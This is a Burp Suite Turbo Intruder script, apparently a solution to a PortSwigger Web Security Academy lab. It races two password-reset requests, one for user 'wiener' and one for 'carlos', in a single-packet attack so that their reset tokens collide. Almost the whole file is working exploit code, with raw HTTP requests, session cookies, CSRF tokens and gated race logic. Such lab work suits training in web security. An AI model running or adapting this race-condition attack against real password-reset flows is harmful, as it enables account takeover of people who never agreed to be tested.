def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='https://0a5800e403f59572851cdb5e00160053.web-security-academy.net',
                           concurrentConnections=2,
                           engine=Engine.BURP2
                           )

    #req2 = r''''''

    req1 = r'''POST /forgot-password HTTP/1.1
Host: 0a5f001e04520be581412f7000d80015.web-security-academy.net
Cookie: phpsessionid=m07E9o0XnIg5DlKQ8QM2ohun32mBqYyi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://0a5f001e04520be581412f7000d80015.web-security-academy.net
Referer: https://0a5f001e04520be581412f7000d80015.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive

csrf=kcVMPRxbXpCg6qkifWyhuLmVN6KEUVF1&username=wiener'''
#session 1, get valid csrf and phpsessionid cookie

    req2 = r'''POST /forgot-password HTTP/1.1
Host: 0a5f001e04520be581412f7000d80015.web-security-academy.net
Cookie: phpsessionid=lFKD1Z7OfEfCDbdTfYeycbIDCkBWoF2h
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://0a5f001e04520be581412f7000d80015.web-security-academy.net
Referer: https://0a5f001e04520be581412f7000d80015.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive

csrf=mgp2VCHKJOAdmIrWDeh3TOiqLjQwgNt8&username=carlos'''
#session 2, get valid csrf and phpsessionid cookie, change username to test

    
    engine.queue(req1)
    for i in range(1):
        engine.queue(req1, gate='race1')
        engine.queue(req2, gate='race1')
    
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)


